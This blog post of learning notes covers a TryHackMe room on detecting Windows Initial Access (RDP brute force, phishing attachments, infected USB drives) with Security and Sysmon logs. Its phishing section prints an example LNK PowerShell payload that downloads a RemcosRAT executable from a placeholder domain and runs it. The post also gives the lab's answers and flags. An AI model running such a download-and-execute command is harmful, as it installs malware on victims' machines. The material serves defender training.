---
layout: post
title: "TryHackMe  - Windows Threat Detection 1"
date: 2026-01-17
tags: ["tryhackme"]
categories: [tryhackme]
hubs: "TryHackMe/SOC Level 1/Windows Security Monitoring"
identifier: "20260117T000000"
source_urls: "(https://tryhackme.com/room/windowsthreatdetection1)"
source_path: "SOC Level 1/Windows Security Monitoring/20260117T000000--tryhackme-windows-threat-detection-1__learning_notes_tryhackme.md"
---

{% raw %}


# TryHackMe | Windows Threat Detection 1

## Task 1 | Introduction

Now that you've learned about Windows logging in the [Windows Logging for SOC](https://tryhackme.com/room/windowsloggingforsoc) room, it's time to put that knowledge into action! This room guides you through common Initial Access and Discovery techniques and teaches how to detect each one using just Windows event logs, the most common log source for real-world SOC teams.

 Learning Objectives 
- Explore how threat actors access and breach Windows machines
- Learn common Initial Access techniques via real-world examples
- Practice detecting every technique using Windows event logs

 Prerequisites  
- Complete the [Windows Logging for SOC](https://tryhackme.com/room/windowsloggingforsoc) room
- Understand the concept of [MITRE](https://tryhackme.com/room/mitre) tactics and techniques
- Know core Windows processes, especially the explorer.exe
- Be ready for a deep dive into Windows threat detection

 Lab Access Before moving forward, start the lab by clicking the **Start Machine**  button below. The VM will open in split view and will need about 2 minutes to fully load. In case the VM is not visible, you can click the **Show Split View**  button at the top of the page.

  Set up your virtual environmentTo successfully complete this room, you'll need to set up your virtual environment. This involves starting the Target Machine, ensuring you're equipped with the necessary tools and access to tackle the challenges ahead.

![Image 1](https://tryhackme.com/static/svg/target-machine.a3955286.svg)

Target machine

![Image 2](data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTciIGhlaWdodD0iMTYiIHZpZXdCb3g9IjAgMCAxNyAxNiIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZD0iTTguODI1MiAwQzQuNDA2NDUgMCAwLjgyNTE5NSAzLjU4MTI1IDAuODI1MTk1IDhDMC44MjUxOTUgMTIuNDE4NyA0LjQwNjQ1IDE2IDguODI1MiAxNkMxMy4yNDM5IDE2IDE2LjgyNTIgMTIuNDE4NyAxNi44MjUyIDhDMTYuODI1MiAzLjU4MTI1IDEzLjI0MzkgMCA4LjgyNTIgMFpNOC44MjUyIDRDOS4zNzczOCA0IDkuODI1MiA0LjQ0NzgxIDkuODI1MiA1QzkuODI1MiA1LjU1MjE5IDkuMzc3MzggNiA4LjgyNTIgNkM4LjI3MzAxIDYgNy44MjUyIDUuNTUzMTIgNy44MjUyIDVDNy44MjUyIDQuNDQ2ODggOC4yNzIwNyA0IDguODI1MiA0Wk0xMC4wNzUyIDEySDcuNTc1MkM3LjE2MjcgMTIgNi44MjUyIDExLjY2NTYgNi44MjUyIDExLjI1QzYuODI1MiAxMC44MzQ0IDcuMTYxMTMgMTAuNSA3LjU3NTIgMTAuNUg4LjA3NTJWOC41SDcuODI1MkM3LjQxMTEzIDguNSA3LjA3NTIgOC4xNjQwNiA3LjA3NTIgNy43NUM3LjA3NTIgNy4zMzU5NCA3LjQxMjcgNyA3LjgyNTIgN0g4LjgyNTJDOS4yMzkyNiA3IDkuNTc1MiA3LjMzNTk0IDkuNTc1MiA3Ljc1VjEwLjVIMTAuMDc1MkMxMC40ODkzIDEwLjUgMTAuODI1MiAxMC44MzU5IDEwLjgyNTIgMTEuMjVDMTAuODI1MiAxMS42NjQxIDEwLjQ5MDggMTIgMTAuMDc1MiAxMloiIGZpbGw9IiM4NzhGQTIiLz4KPC9zdmc+Cg==)

Status:OffStart Machine  Credentials

 Alternatively, you can access the VM from your own VPN-connected machine with the credentials below:

   Username    Administrator        Password    Secure!        IP address    MACHINE_IP        Connection via    RDP

### **Answer the questions below**

**Question:** 

*Answer:* 

     No answer needed

---

## Task 2 | Intro to Initial Access

Initial Access Before moving on, let's recap the concept of Initial Access. Imagine the cyber world as a big city filled with skyscrapers and tiny apartments - each one protected by its own front door. Now imagine threat actors as criminals roaming the streets at night. Some of them pick the lock of a specific office for weeks. Others smash at doors with brute force. And some just try every city door until they find one left open by mistake.

 No matter what the final goal is, the first step of a threat actor is to get through the front door, and the moment an attacker successfully gets in is known as Initial Access. In this room, you will explore various Initial Access methods, but for now, let's divide them into two groups: those requiring an exposed service and those relying on human interaction.

 Exposed Services ![Image 3](https://tryhackme-images.s3.amazonaws.com/user-uploads/678ecc92c80aa206339f0f23/room-content/678ecc92c80aa206339f0f23-1747842641467.svg)

 Putting a Windows server directly on the Internet is a common task for IT teams - corporate websites require an open HTTP port to show content, a mail server can't handle emails without an active SMTP port, and IT admins need RDP to manage the machine remotely. However, every exposed service introduces major security risks. Within minutes, your exposed system can be scanned by automated bots looking for open ports, weak passwords, or unpatched vulnerabilities. And if something is not protected enough, threat actors will use their chance, as proven by these MITRE techniques:

 
- [T1133 / External Remote Services](https://attack.mitre.org/techniques/T1133/): Threat actors will look for exposed RDP/VNC/SSH with weak passwords to get remote access to the machine
- [T1190 / Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/): Threat actors will look for misconfigured or vulnerable websites and applications

 User-Driven Methods ![Image 4](https://tryhackme-images.s3.amazonaws.com/user-uploads/678ecc92c80aa206339f0f23/room-content/678ecc92c80aa206339f0f23-1748289075632.svg)

 But how can the laptop be infected if it is not Internet-exposed? Indeed, unless you help the threat actors yourself, it is very hard to infect your laptop. However, people often help threat actors by clicking on malicious links, launching phishing attachments, using pirated software, picking up unknown USB devices, and so on. And since humans are still the weakest link in cyber security and Windows is the most popular OS for user workstations, you are very likely to handle user-driven Windows Initial Access alerts frequently. The methods are covered by these MITRE techniques:

 
- [T1566 / Phishing](https://attack.mitre.org/techniques/T1566/): Threat actors employ different phishing techniques, tricking users into launching the malware themselves
- [T1091 / Removable Media](https://attack.mitre.org/techniques/T1091/): Threat actors infect a USB device and hope that users will use the USB on multiple PCs

 Usage by Threat Actors Some Initial Access methods are getting popular, and others are declining, and there are many great threat reports on modern Initial Access tendencies (e.g. [Mandiant M-Trends 2025](https://services.google.com/fh/files/misc/m-trends-2025-en.pdf)). Nevertheless, as a SOC analyst, you should know that threat actors will use every chance to breach the target. For example, major ransomware groups like [Medusa](https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a) or [Akira ](https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-109a)used all described techniques at least once in their campaigns.

### **Answer the questions below**

**Question:** 

*Answer:* 

     T1190

**Question:** 

*Answer:* 

     Phishing

---

## Task 3 | Initial Access via RDP

Risks of Exposed RDP As a SOC analyst, you should know that if you expose RDP to the world and set a "12345678" password, your host will be breached within a few days. However, not everyone understands the security risks of an exposed RDP. According to [Censys Search](https://search.censys.io/search?resource=hosts&sort=RELEVANCE&per_page=25&virtual_hosts=EXCLUDE&q=services.service_name%3A+RDP), there are over 5,000,000 RDP-enabled machines right now, and many of them are already under threat actors' control. The problem is so widespread that defenders often call RDP the **R** ansomware **D** eployment **P** rotocol, emphasizing how often an RDP breach directly results in a ransomware attack.

 Detecting RDP Breach In our VM scenario, the IT admin exposed RDP on a production server so that it could be accessed from home on weekends. The credentials were set to Administrator:Summer2025. Let's reconstruct what happened next, just in a few hours, and try to detect it in logs by using Event Viewer (**C:\Users\Desktop\Administrator\Practice\RDP Case\RDP-Security.evtx** **** file):

    # Step of Attack Detection Opportunity     1 **Network Scan** 
Botnet scans our IP and detects an exposed RDP port N/A. Network attacks are out of the room scope   2 **RDP Brute Force** 
Botnet starts a brute force of common user names
(Administrator, admin, support, etc.) 1. Open Security logs and filter for the failed logins (event ID **4625** )
2. Filter for logon types **3**  and **10** , meaning remote logons
3. Filter for logins from external IPs (use "Source IP" field)
4. That's it. You have detected a potential RDP brute force   3 **Initial Access via RDP** 
After around 100 attempts, the botnet guesses
the correct password and enters the system 1. Continue with the list from the previous step
2. Switch the event ID filter to **4624**  (successful logins)
3. Check the account under which the logon was made
4. Now you know which account was used for the Initial Access   4 **Further Malicious Actions** 
Two hours after the breach, the threat actor
logs in via RDP and reviews the Desktop 1. Continue with the list from the previous step
2. Filter for logon type **10** , indicating interactive RDP login
3. Copy the "Logon ID" field from the logon event
4. Open Sysmon logs and search events with the same "Logon ID"
5. You will see all processes started by the threat actor via RDP    Logging Brute Force Interestingly, it is not that hard to spot an exposed RDP just from the Security logs. If you would assign a public IP to your server, disable the firewall, enable RDP, and wait around an hour - you would see the logs just like on the screenshot. Botnets around the world will immediately start brute forcing your server, generating hundreds of 4625 events that you won't miss! Note, however, that RDP can be breached without a brute force if threat actors [knew the credentials in advance](https://socradar.io/rdp-access-sales-on-dark-web-forums-detected-by-socradar/), but that is a topic for another room.

 ![Image 5](https://tryhackme-images.s3.amazonaws.com/user-uploads/678ecc92c80aa206339f0f23/room-content/678ecc92c80aa206339f0f23-1748279616621.png)

  For this task, open the VM and analyze the logs of the RDP breach scenario:
**C:\Users\Administrator\Desktop\Practice\RDP Case\RDP-Security.evtx**

### **Answer the questions below**

**Question:** 

*Answer:* 

     Administrator

**Question:** 

*Answer:* 

     203.205.34.107

**Question:** 

*Answer:* 

     DESKTOP-QNBC4UU

---

## Task 4 | Initial Access via Phishing

Current State of Phishing Phishing attacks are still a major threat as they can't be mitigated as easily as blocking RDP access. If users have access to the Internet, they will eventually bring malware to their laptops, bypassing the firewall entirely. According to the [HoxHunt Phishing Trends Report for 2025](https://hoxhunt.com/guide/phishing-trends-report), phishing attacks have increased 41 times since the release of ChatGPT in 2022. Even more, the success rate of these campaigns remains high, meaning users are still falling for them. In this task, we'll focus on two phishing techniques that lead to Windows breaches: malicious binaries and LNK attachments.

 Binary Attachments In Windows, there are [lots](https://github.com/michalzobec/Security-Blocked-File-Extensions-Attachments/blob/main/list-of-blocked-file-extensions.txt) of executable extensions, and while most people know not to open untrusted **.exe**  files, they are usually less cautious about **.com** , **.scr** , or **.cpl**  files. However, all of them can contain the malware inside. For example, users are very likely to open the attached "tryhatme.com" file name assuming it to be a link to a meeting invite, not a malicious binary.

 To make it worse, Windows hides known file extensions by default, meaning that the file "program.exe" will be shown to you just as "program". Threat actors [often abuse it](https://attack.mitre.org/techniques/T1036/007/) by naming their viruses like "invoice.pdf.exe" or "cat.png.com" and changing the icons to fit the topic. See the screenshots below to understand how the malicious file looks for the common user:

    **Known Extensions Hidden by Default
(invoice.pdf.exe)**  **.COM Malware Shines if Extensions Are Shown
(tryhatme.com)**    

![Image 6](https://tryhackme-images.s3.amazonaws.com/user-uploads/678ecc92c80aa206339f0f23/room-content/678ecc92c80aa206339f0f23-1746484332604.png)

 

![Image 7](https://tryhackme-images.s3.amazonaws.com/user-uploads/678ecc92c80aa206339f0f23/room-content/678ecc92c80aa206339f0f23-1746487115918.png)

    LNK Attachments To avoid AV detection, threat actors may prefer attaching PowerShell, Visual Basic, or BAT scripts over binaries. A popular way to make the scripts look trustworthy is to hide them behind LNK shortcuts - the same files you have on your Desktop that point to real executables somewhere in the Program Files folder.

 Imagine receiving an email from a local PC store announcing major discounts and asking you to review the details in an attached archive. As in the screenshot below, the **Discounts.zip**  contains two files: a PDF and a shortcut to the website. You carefully analyze the PDF and see that it is just a poster with the latest discounts. Engaged by the news, you rush to open the shortcut, only to find out that it points to a PowerShell command instead of the legitimate website.

    **LNK With PowerShell Payload (Visit Our Website!.lnk)**    

![Image 8](https://tryhackme-images.s3.amazonaws.com/user-uploads/678ecc92c80aa206339f0f23/room-content/678ecc92c80aa206339f0f23-1747673587457.png)

    Threat actors can include any command inside the LNK "Target" field, as well as set any shortcut icon. You can verify it by right-clicking the LNK file, selecting "Properties", and viewing the "Shortcut" tab. The case shown above, for example, downloads and executes a simplified version of RemcosRAT - malware used in many attacks on major companies and government agencies. The terminal below shows a full LNK payload:

   LNK Download -> PowerShell -> RemcosRAT 
```LNK Download -> PowerShell -> RemcosRAT 
powershell.exe -c ...
# Download the encoded malware
(New-object System.Net.WebClient).DownloadFile('https://breacheddomain.thm/FILTERED/r.exe','C:\\ProgramData\\r.exe');
# Run the malware (RemcosRAT)
start C:\\ProgramData\\r.exe;
```

    In this task, you will investigate three phishing attachment examples stored in:
**C:\Users\Administrator\Desktop\Practice\Phishing Case 1-3**

### **Answer the questions below**

**Question:** 

*Answer:* 

     THM{misleading_extension}

**Question:** 

*Answer:* 

     http://wp16.hqywlqpa.thm:8000/cgi-bin/f

**Question:** 

*Answer:* 

     best-cat.jpg.exe

---

## Task 5 | Continuing Phishing Topic

Detecting Malicious Download It is relatively simple to hunt for malicious downloads if you know how the victim sees it. First, the user uses a web browser or desktop application to open a phishing attachment. In the simplest case, it would be a direct .exe malware download, but you are far more likely to see an archive attachment like .zip or .rar containing the malware. In this case, Sysmon can greatly help you detect every attack stage:

   Sysmon Event Chain for Double-Extension Attachment 
```Sysmon Event Chain for Double-Extension Attachment 
# 1. Sysmon Event ID 1: Web browser is launched
Image: C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe
ParentImage: C:\Windows\Explorer.EXE

# 2. Sysmon Event ID 11: A file (usually archive) appears in Downloads
Image: C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe
TargetFilename: C:\Users\User\Downloads\invoice.zip*

# 3. Sysmon Event ID 11: Optionally, the user unarchives files to some folder
Image: C:\Windows\Explorer.EXE (or C:\Program Files\7-Zip\7zG.exe)
TargetFilename: C:\Users\User\Downloads\invoice.pdf.exe

# 4. Sysmon Event ID 1: The user double-clicks the unarchived file
Image: C:\Users\User\Downloads\invoice.pdf.exe
ParentImage: C:\Windows\Explorer.EXE
```

   ![Image 9](https://tryhackme-images.s3.amazonaws.com/user-uploads/678ecc92c80aa206339f0f23/room-content/678ecc92c80aa206339f0f23-1747747387487.svg)

 Notes on LNK Attachments Unlike with binary attachments, LNK files have a very interesting and important capability - they leave little execution trace. Consider the case on the screenshot below, where a user downloaded LNK file that looks like a Google Chrome shortcut, but in fact runs some PowerShell payload.

 After the user launches the shortcut - Windows Explorer reads the "Target" field of the LNK and makes it look like explorer.exe launches PowerShell directly. Still, you can identify if it was indeed LNK phishing or another attack vector by looking for the preceding file creation events - LNK files must have appeared somewhere in Downloads before:

 ![Image 10](https://tryhackme-images.s3.amazonaws.com/user-uploads/678ecc92c80aa206339f0f23/room-content/678ecc92c80aa206339f0f23-1747747387501.png)

  In this task, let's try to investigate the third phishing case by checking the attached Sysmon logs:
**C:\Users\Administrator\Desktop\Practice\Phishing Case 3\Phishing-Sysmon.evtx**

### **Answer the questions below**

**Question:** 

*Answer:* 

     C:\Users\Administrator\Downloads\top-cats.zip

**Question:** 

*Answer:* 

     C:\Users\Administrator\Pictures

**Question:** 

*Answer:* 

     5484

**Question:** 

*Answer:* 

     rjj.store

---

## Task 6 | Initial Access via USB

Risks of Removable Media Although some may believe that days of infected USB flash drives are long gone and cloud services have replaced them completely, threat actors will disagree, as proven by [Camaro Dragon](https://research.checkpoint.com/2023/beyond-the-horizon-traveling-the-world-on-camaro-dragons-usb-flash-drives/) or [Raspberry Robin](https://redcanary.com/blog/threat-intelligence/raspberry-robin/) attacks. Moreover, Initial Access via an infected USB bypasses firewalls, much like phishing, and can start the attack chain even without Internet access and continue spreading without user interaction.

 **USB Delivery Case**

 Imagine working for TryHatMe Inc. and receiving a delivery package with a fancy hat and a USB labelled as "A gift from HR". You plug it in, a harmless GIF pops up, and you call HR to thank them for the present. But while the HR figures out what you meant, the malware from the USB has already spread to your laptop. ([Real-World Case](https://hackread.com/fbi-hackers-mail-malicious-usb-drives-ransomware/))

 **Print Service Case**

 Another common scenario involves third-party entities like a print service. Suppose you visit one and hand over your USB to print a document. Their system, already infected with a worm, passes the malware onto your flash drive. Then, you bring the malware back to your home PC, and the infection chain continues. Now, let's learn how to detect this before it's too late! ([Real-World Story](https://www.malwarebytes.com/blog/news/2025/05/malware-infected-printer-delivered-something-extra-to-windows-users))

 Detecting an Infected USB Although there are many advanced techniques on how to run the malware from USB automatically as soon as the flash drive is plugged in, the majority of cases occur just because the user launches malware themselves. For example:

 
- Malware hides all legitimate files on USB and creates a malicious "**RECOVERY.lnk** " file
- Malware creates a "**Photos.exe** " binary and sets its icon to look like a simple folder
- Malware creates double-extension copies of all files, like "**photo_2024_1_12.jpg.exe** "

 Interestingly, the detection of Initial Access via USB looks very similar to the phishing attachments. Since both methods rely on a user running malicious binary via a graphical interface (explorer.exe), you may have a hard time understanding how exactly the attack started. Still, in some cases, you may find evidence of execution from external drives like "E:\malware.exe":

 ![Image 11](https://tryhackme-images.s3.amazonaws.com/user-uploads/678ecc92c80aa206339f0f23/room-content/678ecc92c80aa206339f0f23-1747750355473.svg)

  For this task, you will investigate a typical attack chain via USB using the attached Sysmon logs:
**C:\Users\Administrator\Desktop\Practice\USB Case\USB-Sysmon.evtx**

### **Answer the questions below**

**Question:** 

*Answer:* 

     E:\Open Sandisk 4GB USB.exe

**Question:** 

*Answer:* 

     C:\Users\Public\Documents\winupdate.exe

**Question:** 

*Answer:* 

     F:

---

## Task 7 | Conclusion

Great job completing the room! Knowing the common Initial Access methods helps prevent them, and your acquired knowledge of detecting attacks in their first stages will be invaluable for quick alert triage and timely incident response.

 Key Takeaways 
- The two most common Windows Initial Access methods are exposed services and user-driven attacks
- Initial Access via RDP can be easily detected using default authentication logs (4624/4625)
- User-driven attacks are best detected by process execution events, preferably Sysmon ones
- Each Initial Access method (like LNK) has unique features that you will learn through practice

### **Answer the questions below**

**Question:** 

*Answer:* 

     No answer needed

---
{% endraw %}
